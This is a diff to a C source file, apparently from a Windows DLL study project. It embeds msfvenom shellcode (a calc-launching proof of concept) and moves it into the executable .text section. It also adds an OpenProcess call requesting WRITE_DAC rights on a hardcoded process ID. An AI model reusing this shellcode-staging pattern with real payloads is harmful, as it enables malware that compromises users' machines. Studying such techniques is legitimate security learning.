@@ -1,8 +1,9 @@
 #include "Externals.h"
 
 //Bonus! .rodata msvenom PayLoad Allocation!
+#pragma section(".text")
 
-const unsigned char ShellCodePayload[] =
+__declspec(allocate(".text")) const unsigned char ShellCodePayload[] =
 {
 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
@@ -29,10 +30,10 @@ const unsigned char ShellCodePayload[] =
 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
 };
 
-void call(void)
+int call(void)
 {
 	HMODULE hModule = GetModuleHandleA("Libraries\\DLL_Study.dll");
-	//printf("%p\n", &ShellCodePayload);
+	printf("%p\n", &ShellCodePayload);
 	if (hModule == NULL)
 	{
 		printf("Failed To Find In Memory The Desired DLL Handle!\nAttempting To Fetch Library...\n");
@@ -48,6 +49,9 @@ void call(void)
 	CircusFunctionPointer Circus = (CircusFunctionPointer)fpCircus;	
 	
 	if (Circus() == 7) printf("AHAHAHAHA Like That Would Stop The Circus\n");
-	
-	return;
+	HANDLE hNotepad = INVALID_HANDLE_VALUE;
+	hNotepad = OpenProcess(WRITE_DAC, TRUE, 48452);
+	if (hNotepad == INVALID_HANDLE_VALUE) return -1;
+	CloseHandle(hNotepad);
+	return 0;
 }
